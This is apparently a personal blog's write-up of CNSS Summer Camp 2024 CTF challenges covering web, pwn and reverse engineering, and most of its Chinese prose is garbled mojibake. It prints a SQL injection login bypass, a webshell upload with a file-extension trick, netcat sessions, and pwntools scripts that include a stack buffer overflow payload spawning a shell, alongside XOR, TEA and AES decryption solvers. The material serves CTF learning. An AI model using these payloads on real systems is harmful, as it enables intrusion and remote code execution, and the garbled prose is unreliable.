CNSSå¨˜çš„è´¦å·æ˜¯ admin , ç™»é™†æŸ¥çœ‹CNSSå¨˜è—åœ¨åå°çš„ç§˜å¯†â€¦â€¦ sqlæ³¨å…¥' or 1='1ã€‚ 1CNSS{h0w_d0_y0u_637_7h3_p455w0rd1?} ğŸ®20482048çœŸå¥½ç©ï¼Œç©åˆ°1000000åˆ†å°±èƒ½æ‹¿åˆ°flagï¼ ä¸æ˜¯ï¼Œä½ çœŸç©å•Šï¼Ÿ ç¦äº†F12å’Œå³é”®ï¼ŒCtrl+Shift+Iæ‰“å¼€æ§åˆ¶å°ï¼ŒæŸ¥çœ‹FlagæŒ‰é’®çš„HTMLæ ‡ç­¾ï¼Œæ³¨æ„åˆ° 1&lt;input type=&quot;button&quot; onclick=&quot;getflag()&quot; value=&quot;Flag&quot;&gt; åœ¨Sourcesçš„main2048.jsä¸­æŸ¥åˆ°getflag()å‡½æ•°ï¼ˆä»¥åŠä¸‹é¢å„ç§å±è”½ï¼‰ï¼Œå‘ç°æ˜¯ä¸€å †ä¹±ç ã€‚æƒ³æ³•æ˜¯æ‰¾åˆ°åˆ¤æ–­ç‚¹1000000åˆ†ä½†æ˜¯æ²¡æŸ¥åˆ°ï¼Œå¤åˆ¶ä¸‹æ¥è½¬å»æŸ¥scoreï¼Œå‘ç° 1if(score&gt;=0xf4240) è¿™ä¸ª0xf4240åˆšå¥½æ˜¯1000000ï¼Œç»™å®ƒæ”¹æˆ0å†æŒ‰ä¸€ä¸‹FlagæŒ‰é’®å³å¯æ‹¿åˆ°flagã€‚ 1cnss{3asy_fr0nt_kn0w1edge!!!} ğŸ‘¤æ¢ä¸ªå¤´åƒå…ˆCNSSå¨˜è¿™ä¹ˆå¯çˆ±ï¼Œä½ ç¡®å®šè¦æŠŠå¥¹æ¢æ‰å—ï¼Ÿ çœŸçš„åªèƒ½ä¸Šä¼ å›¾ç‰‡å—ï¼Ÿ è´¦å·å¯†ç éƒ½æ˜¯adminç™»é™†ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚æ”¹ä¸€ä¸‹åç¼€ç»•è¿‡æ£€æŸ¥ï¼Œå…ˆæŠŠphpæ”¹æˆpngï¼Œä¸Šèšå‰‘è¿æ¥getshellã€‚ ğŸ’¥PwnPwnçœŸæ˜¯å¤ªæœ‰è¶£è¾£ï¼ä»é›¶å¼€å§‹çš„PWNä¹‹è·¯ï¼ ğŸ˜¯nc? nc!nc 152.136.11.155 10020 system(â€˜/bin/shâ€™)ï¼Œç›´æ¥netcatä¸€é”®getshellï¼ŒLinuxè¿æ¥ï¼Œcat flag 12345$ nc 152.136.11.155 10020 Welcome to CNSS Recruit 2024!Start your journey to become a pwn master!cat flagcnss{Welcome_to_pwn_world!} ğŸ¤–Botå·å·å‘Šè¯‰ä½ ï¼ŒCNSSå¨˜boté‡Œå…¶å®è—äº†ä¸€ä¸ªäººã€‚ å‰ä»»ä¸­ä¹‹äººShinoï¼Œéšç€å¹´çºªæ¸é•¿ï¼Œå·²ç»æ— æ³•æ»¡è¶³ç¾¤å‹æ—¥ç›Šå¢é•¿çš„æ°´ç¾¤éœ€æ±‚ã€‚CNSSå¨˜è¿«åˆ‡éœ€è¦æ–°çš„æ¥ç­äººï¼ ä¸ºäº†ä¸è¢«ç¾¤å‹è¯†ç ´ï¼Œä½ éœ€è¦æŒ‰ç…§æ“ä½œè§„èŒƒæ°´ç¾¤ï¼šå®Œæˆ100æ¬¡äº¤äº’å³å¯é€šè¿‡è€ƒæ ¸ã€‚ nc 152.136.11.155 10021 æœ‰ä¸ªå¾ˆå¥½ç”¨çš„åº“å«pwntoolsï¼ ä¸€é“Pwntooläº¤äº’é¢˜ã€‚ç¨‹åºçš„é€»è¾‘å°±æ˜¯å¾ªç¯100æ¬¡åè·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œsystemå‡½æ•°ã€‚åœ¨å¾ªç¯å†…éƒ¨ä¼šæ‰§è¡Œbroadcastæˆ–bot_pingè¿™ä¸¤ä¸ªå‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import rehost = '152.136.11.155'port = 10021p = remote(host, port)for i in range(100): data = p.recvline().decode() if '[SYSTEM]' in data: match = re.search(r'\\[SYSTEM\\]\\[(.*?)\\]\\((\\d+)pt\\)--\\[(.*?)\\]\\((\\d+)pt\\)', data) if match: player_id = match.group(1) player_score = int(match.group(2)) item_name = match.group(3) item_score = int(match.group(4)) expected_response = f&quot;Congratulations to {player_id} for passing [{item_name}], current score is {player_score + item_score} points!&quot; p.sendline(expected_response.encode()) elif '[USER]' in data: if '#ping' in data: p.sendline('pong!'.encode()) elif 'Too Slow' in data: print(&quot;Timeout or unexpected issue occurred.&quot;) break else: print(f&quot;Unhandled data: {data}&quot;)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{GnAlPu8Q-KL65ZOTK-hahahaha-U9BvTeeI}&quot;&quot;&quot; ğŸ’“Overflow Meå°æ•°ç»„è¦è¢«å¡æ»¡äº†ï¼ nc 152.136.11.155 10022 123456789101112131415161718int __fastcall main(int argc, const char **argv, const char **envp){ _BYTE buf[16]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); my_init(argc, argv, envp); puts(&quot;Over flow me pls:&quot;); read(0, buf, 0x20uLL); if ( v5 != 114514 ) { puts(&quot;wrong,try again&quot;); exit(0); } system(&quot;/bin/sh&quot;); return 0;} æœ€åŸºç¡€çš„æ ˆæº¢å‡ºã€‚ 123456789101112131415from pwn import *host = '152.136.11.155'port = 10022p = remote(host, port)padding = 16payload = b'p' * padding + p64(114514)p.sendlineafter('Over flow me pls:', payload)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{Kz20UZyn-TNTfrc4Z-jiejiejie-sDwO2bC0}&quot;&quot;&quot; ğŸ”Reverseè¿™ä¸ªå¤å¤©ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è¿‘äº†é‚£ä¸ªå¥³äººã€‚ ğŸ˜é‚£ä¸ªå¥³äººä¸Šè¯¾çš„æ—¶å€™Shinoè€å¸ˆè®²äº†ä¸€ä¸ªå·¥å…·å¯ä»¥ç”¨æ¥é€†å‘è½¯ä»¶ï¼Œä½†æ˜¯Timlzhå¿˜æ‰è½¯ä»¶å«ä»€ä¹ˆäº†ï¼Œåªè®°å¾—å¤´åƒæ˜¯é‚£ä¸ªå¥³äººâ€¦â€¦ æˆåŠŸå®‰è£…IDA Proï¼Œæ‰“å¼€å³å¾—flag 1CNSS{Sh3_1s_IDA!W3lc0m3_t0_Rev3rse_W0rld!} ğŸ˜­æˆ‘çš„flagç¢äº†ä¸€åœ°æˆ‘çš„flagç¢æ‰äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾å›æ¥å—ï¼Ÿ ç”¨IDAæ‰“å¼€æ‰¾flagã€å­¦ä¼šåœ¨IDAä¸­ä½¿ç”¨F5ã€‚ æ‰“å¼€IDAå‘ç°ä¸‰ä¸ªhintï¼ŒShift+F12èƒ½æ‰“å¼€Stringsï¼Œæ‰¾åˆ°ç¬¬ä¸€éƒ¨åˆ†ï¼›å·¦ä¾§Functionsæ ä¸Šæ–¹æ‰¾åˆ°ç¬¬äºŒéƒ¨åˆ†ï¼›æ ¹æ®æç¤ºï¼ŒXæŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼Œæ‰¾åˆ°funs718ï¼ŒF5çœ‹åˆ° 1234567891011121314151617int func718(){ puts(&quot;718&quot;); br0ken_4parT_(); putchar(66); putchar(117); putchar(55); putchar(95); putchar(89); putchar(48); putchar(117); putchar(95); putchar(99); putchar(64); putchar(110); return putchar(95);} è¿™é‡Œputcharç»™çš„ä¸å®Œæ•´ï¼Œé€€å›å»èƒ½çœ‹åˆ°å®Œæ•´çš„æœ€åä¸€éƒ¨åˆ†ï¼Œæ‹¿åˆ°flag 1CNSS{My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!} âœˆï¸æ‰“é£æœºé«˜æ‰‹ä½ ä¼šæ‰“é£æœºå—ï¼Ÿé«˜åˆ†æœ‰å¥–å“¦ï¼âœˆï¸ Patch Program æ‰¾ç¨‹åºæ¼æ´ï¼Œä¿®æ”¹é€»è¾‘ä»¥å‡ºç°flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int __fastcall main(int argc, const char **argv, const char **envp){ _main(argc, argv, envp); Startup(); while ( IsOver ) { UpdateInput(); UpdateNormal(); Show(); } printf(&quot;\\t\\tYou Are so WEAK!\\n&quot;); Sleep(0x9C4u); system(&quot;pause&quot;); return 0;}int Show(){ int result; // eax int j; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] HideCursor(); gotoxy(1LL, 1LL); for ( i = 0; i &lt;= 26; ++i ) { for ( j = 0; j &lt;= 61; ++j ) { switch ( canvas[62 * i + j] ) { case 1: printf(&quot;*&quot;); break; case 2: printf(asc_14001301C); break; case 3: printf(&amp;asc_14001301C[2]); break; case 0xFFFFFFFF: printf(&amp;asc_14001301C[4]); break; default: if ( canvas[62 * i + j] ) { if ( canvas[62 * i + j] == 4 ) printf(&amp;asc_14001301C[8]); } else { printf(&amp;asc_14001301C[6]); } break; } } printf(&amp;asc_14001301C[10]); } printf(&quot;\\nScore: %d&quot;, score); result = score; if ( score &gt; 1145141918 ) { printf(&quot;\\t\\tWell Done! You got the flag!\\n\\t\\t&quot;); get_flag(); // å‘ç°å¯ç–‘å‡½æ•°!!! Sleep(0x9C4u); return system(&quot;pause&quot;); } return result;} åœ¨å‡½æ•°å¼€å¤´ç›´æ¥æ”¾ä¸Šå¯ç–‘å‡½æ•°å³å¯ï¼ŒEdit-Patch Program-Assembleï¼Œå³é”®ã€é€€å‡ºã€é¼ æ ‡ç‚¹å‡»ç©ºç™½å¤„å°±å¯ä»¥çœ‹åˆ°å˜åŒ–åçš„ä»£ç ï¼Œæœ€åè®°å¾—Apply Patches toâ€¦ è¿è¡Œä¿®æ”¹å¥½çš„exeç¨‹åºï¼Œæ‹¿åˆ°flag 1cnss{w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!} â™¾ï¸äº¦çœŸäº¦æˆ–äº¦å‡å°Šå˜Ÿå‡å˜Ÿ? O.o çº¯åŠ å¯†é¢˜ï¼Œæ ¹æ®é¢˜ç›®ä¸éš¾çŒœæ˜¯å¼‚æˆ–ç›¸å…³çš„ã€‚IDAæ‰“å¼€ä»¥åCtrl+FæŸ¥ä¸€ä¸‹mainå‡½æ•°ï¼Œçœ‹ä¸€ä¸‹ä»£ç é€»è¾‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __fastcall main(int argc, const char **argv, const char **envp){ _QWORD v4[12]; // [rsp+20h] [rbp-60h] BYREF int v5; // [rsp+80h] [rbp+0h] _QWORD v6[12]; // [rsp+90h] [rbp+10h] BYREF int v7; // [rsp+F0h] [rbp+70h] int i; // [rsp+FCh] [rbp+7Ch] _main(argc, argv, envp); v6[0] = 0x731047656E6F7579LL; v6[1] = 0x761B45794B10407DLL; v6[2] = 0x6E005B71491F585FLL; v6[3] = 0x45045205575D01LL; memset(&amp;v6[4], 0, 64); v7 = 0; memset(v4, 0, sizeof(v4)); v5 = 0; printf(&quot;Input your flag: &quot;); scanf(&quot;%s&quot;, v4); eNc0d3(v4); // å‘ç°å¯ç–‘ç‚¹ï¼Œè¿™é‡Œå¯¹v4è¿›è¡Œäº†åŠ å¯† for ( i = 0; i &lt;= 30; ++i ) { if ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) ) { printf(&quot;Wrong!\\n&quot;); return 0; } } printf(&quot;Correct!\\n&quot;); return 0;}__int64 __fastcall eNc0d3(__int64 a1){ __int64 result; // rax int i; // [rsp+8h] [rbp-8h] int v3; // [rsp+Ch] [rbp-4h] v3 = 26; for ( i = 0; ; ++i ) { result = *(unsigned __int8 *)(a1 + i); if ( !(_BYTE)result ) break; *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i); } return result;} åŠ å¯†æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè¯»å–flagåœ°å€åŠ ä¸Šiåç§»ä½ç½®çš„ä¸€ä¸ªå­—èŠ‚ã€‚å°†v3å’Œè¯»å–åˆ°çš„å­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœå†™å›åˆ°åŒä¸€ä½ç½®ã€‚ ä¸»å‡½æ•°å¾ªç¯æ˜¯åœ¨æ¯”è¾ƒåŠ å¯†åv4å’Œv6çš„å‰30ä¸ªå­—èŠ‚æ˜¯å¦ç›¸åŒï¼Œä¹Ÿå°±æ˜¯ç»™æˆ‘ä»¬å¯†æ–‡v6ï¼Œè¿˜åŸæ˜æ–‡å³å¯ã€‚ 123456789101112131415161718#include &lt;stdio.h&gt;int main() { char c[32]; *(long long *)&amp;c[0] = 0x731047656E6F7579LL; *(long long *)&amp;c[8] = 0x761B45794B10407DLL; *(long long *)&amp;c[16] = 0x6E005B71491F585FLL; *(long long *)&amp;c[24] = 0x45045205575D01LL; int v3 = 26; for (int i = 0; i &lt; 31; i++) { c[i] ^= v3++; } printf(&quot;%s&quot;, c); return 0;}/* cnss{X0R_c4n_b3_us3d_t0_3nc0d3} */ ğŸµèŒ¶æ¯å¤´å¤§å†’é™©çˆ±å…»ç”Ÿçš„Timlzhå¸¦ç€ä»–çš„èŒ¶æ¯å¤´æ¥å‘ä½ æ±‚åŠ©ï¼Œä½ èƒ½å¸®ä»–æ‰¾åˆ°ä»–å¿ƒçˆ±çš„èŒ¶å£¶å—ğŸ˜” çº¯åŠ å¯†é¢˜ï¼Œæœäº†ä¸€ä¸‹åº”è¯¥æ˜¯å±äºTEAåŠ å¯†ï¼Œé—»æ‰€æœªé—»ï¼Œçœ‹ä¸€ä¸‹ä»£ç é€»è¾‘ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int __fastcall main(int argc, const char **argv, const char **envp){ _DWORD Str[8]; // [rsp+20h] [rbp-60h] BYREF _DWORD v5[8]; // [rsp+40h] [rbp-40h] unsigned int v6[6]; // [rsp+60h] [rbp-20h] BYREF int j; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] _main(argc, argv, envp); v6[0] = 429459223; v6[1] = 537200643; v6[2] = 537462290; v6[3] = 537006083; v5[0] = -999025570; v5[1] = 970203505; v5[2] = -181949973; v5[3] = -483739382; v5[4] = 1062983671; v5[5] = -697079924; printf(&quot;input the flag: \\n&quot;); scanf(&quot;%s&quot;, Str); if ( strlen((const char *)Str) == 24 ) { for ( i = 0; i &lt;= 4; ++i ) encrypt(&amp;Str[i], v6); for ( j = 0; j &lt;= 5; ++j ) { if ( Str[j] != v5[j] ) { printf(&quot;it's not my teapot!&quot;); return 0; } } printf(&quot;Oh my god, you made it?!&quot;); system(&quot;pause&quot;); return 0; } else { printf(&quot;the length is NSFW~~~&quot;); return 0; }}__int64 __fastcall encrypt(unsigned int *a1, unsigned int *a2){ __int64 result; // rax unsigned int i; // [rsp+10h] [rbp-10h] unsigned int v4; // [rsp+14h] [rbp-Ch] unsigned int v5; // [rsp+18h] [rbp-8h] unsigned int v6; // [rsp+1Ch] [rbp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) { v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (a2[v4 &amp; 3] + v4); v4 += 289739793; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (a2[(v4 &gt;&gt; 11) &amp; 3] + v4); } *a1 = v6; result = v5; a1[1] = v5; return result;} åŠ å¯†è¿‡ç¨‹a1æ˜¯æ˜æ–‡ï¼Œa2æ˜¯å¯†é’¥ã€‚ 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t* v, const uint32_t* key) { uint32_t v0 = v[0], v1 = v[1]; const uint32_t delta = 0x11451411; uint32_t sum = delta * 32; for (int i = 0; i &lt; 32; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main() { uint32_t key[4] = {429459223, 537200643, 537462290, 537006083}; uint32_t enc[6] = {0xC474145E, 0x39D42171, 0xF527A9EB, 0xE32AB90A, 0x3F5BD7F7, 0xD673678C}; for (int i = 4; i &gt;= 0; i--) { decrypt(&amp;enc[i], key); } for (int i = 0; i &lt; 6; i++) { printf(&quot;%c%c%c%c&quot;, enc[i] &amp; 0xFF, (enc[i] &gt;&gt; 8) &amp; 0xFF, (enc[i] &gt;&gt; 16) &amp; 0xFF, (enc[i] &gt;&gt; 24) &amp; 0xFF); } putchar('\\n'); return 0;}/* cnss{Enj0y_te4_W!th_me!} */ ğŸ’¥çˆ†äº†çˆ†äº†ï¼Œå’Œ JAVA çˆ†äº†å•Šï¼Ÿé€†å‘è¿˜è¦å­¦ Javaï¼Ÿ éå¸¸ç®€å•ä¸”å…¥é—¨çš„å®‰å“é€†å‘ ä½ éœ€è¦äº†è§£apkæ–‡ä»¶ç»“æ„ JEBæˆ–JADXçš„ä½¿ç”¨ ä»¥åŠç®€å•çš„javaè¯­æ³• JADXæ‰“å¼€ï¼Œç¿»æ‰¾ä¸€é€šï¼Œæ‰¾åˆ°com.cnss.myapplicationï¼Œå°±æ˜¯è¿™é“é¢˜çš„å…³é”®äº†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586class Test: def __init__(self): self.str = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'] def main(self): a = [ &quot;SJNPhthkmYBHow5Y75wRDa==&quot;, &quot;RoBAU/g/jlxuy+Ns1YtA86==&quot;, &quot;YZNTjQcHgoBaqf5hyYtM0K==&quot;, &quot;Z1Z/gv18ro1pkgF2rX5x+6==&quot;, ...#100ä¸ª &quot;bXF7hfV5smIOu/1q159Q16==&quot;, &quot;c441i+Z6r55Lmf9H4V=XD===&quot;, &quot;aY1MmRldcYRrtdlh50RJC===&quot;, &quot;Y5dYaAcAjoBtug1NwYFUBa==&quot;, &quot;TIk6kw9/pnZ41eRs1IZr4a==&quot;, &quot;cIU9ZQpjiINPy/kOw31OEa==&quot; ] for i in range(100): s = self.decode(a[i]) print(a[i]) print(s) def decode(self, code): length = len(code) if length == 0 or length % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') result = [] block_num = length // 4 for i in range(block_num): after_decode = self.decode_detail(code[i * 4:(i * 4) + 4]) if after_decode: result.append(after_decode) result_str = ''.join(result) return result_str[:len(result_str) - end_equal_num] def decode_detail(self, s): if len(s) != 4: return None a1 = self.get_index(s[0]) self.qwq() a2 = self.get_index(s[1]) self.qwq() a3 = self.get_index(s[2]) self.qwq() a4 = self.get_index(s[3]) self.qwq() b = [ chr((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4)), chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)), chr(((a3 &amp; 3) &lt;&lt; 6) | a4) ] return ''.join(b) def get_index(self, c): try: return self.str.index(c) except ValueError: return -1 def qwq(self): tmp = [None] * 64 for i in range(len(self.str)): tmp[i] = self.str[(i + 2) % 64] self.str = tmp.copy()if __name__ == &quot;__main__&quot;: test = Test() test.main() æ ¹æ®æç¤ºï¼Œkey is a meaningful sentenceï¼Œå†™ä¸ªpythonè„šæœ¬è§£ä¸€ä¸‹base64ï¼Œå¾—åˆ°å¯†é’¥ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpaddef decode(code): if len(code) == 0 or len(code) % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') decoded_str = '' for i in range(0, len(code), 4): decoded_str += decode_detail(code[i:i+4]) result = decoded_str[:-end_equal_num] return resultdef decode_detail(encoded_str): str_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; a1 = str_chars.index(encoded_str[0]) a2 = str_chars.index(encoded_str[1]) a3 = str_chars.index(encoded_str[2]) a4 = str_chars.index(encoded_str[3]) b = chr(((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4))) + \\ chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)) + \\ chr(((a3 &amp; 3) &lt;&lt; 6) | a4) return bdef qvq(key_str): cipher_text = b64decode(&quot;11VaDwVeOwKvL6eqb2hsA2rb0wTbTRwsb7WirGpBW8s=&quot;) key = key_str.encode('utf-8') cipher = AES.new(key, AES.MODE_ECB) decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size) return decrypted_data.decode('utf-8')key = &quot;I am CNSS AESkey&quot;decrypted_message = qvq(key)print(decrypted_message)&quot;&quot;&quot;cnss{We1c0Me t0 Andorid Rev!}&quot;&quot;&quot; ğŸ§©Miscæ²¡æ€ä¹ˆåšï¼Œä¹Ÿåšä¸å‡ºæ¥ï¼Œç¬‘æ­»ã€‚åšå‡ºæ¥ä¸€é“éŸ³é¢‘éšå†™è¿˜æœ‰ä¸€é“Wordæ–‡æ¡£æŸ¥æ—¶é—´çš„é¢˜ã€‚ å¾ˆæœ‰è¶£çš„ä¸€æ¬¡ç»å†ï¼Œå˜»å˜»&gt;.&lt;","link":"/2024/09/07/CNSS-Summer-Camp-2024/"}],"tags":[{"name":"DevOps","slug":"DevOps","link":"/tags/DevOps/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Dev","slug":"Dev","link":"/tags/Dev/"},{"name":"CNSS","slug":"CNSS","link":"/tags/CNSS/"},{"name":"ARM","slug":"ARM","link":"/tags/ARM/"},{"name":"Computer Architecture","slug":"Computer-Architecture","link":"/tags/Computer-Architecture/"},{"name":"Math","slug":"Math","link":"/tags/Math/"},{"name":"Abstract Algebra","slug":"Abstract-Algebra","link":"/tags/Abstract-Algebra/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"Group Theory","slug":"Group-Theory","link":"/tags/Group-Theory/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"}],"categories":[{"name":"DevOps","slug":"DevOps","link":"/categories/DevOps/"},{"name":"Computer Architecture","slug":"Computer-Architecture","link":"/categories/Computer-Architecture/"},{"name":"Crypto","slug":"Crypto","link":"/categories/Crypto/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}],"pages":[{"title":"About Me","text":"ä¸€åæ™®æ™®é€šé€šçƒ­çˆ±ç”Ÿæ´»çš„è®¡ç®—æœºæœ¬ç§‘ç”Ÿã€‚","link":"/about/index.html"}]}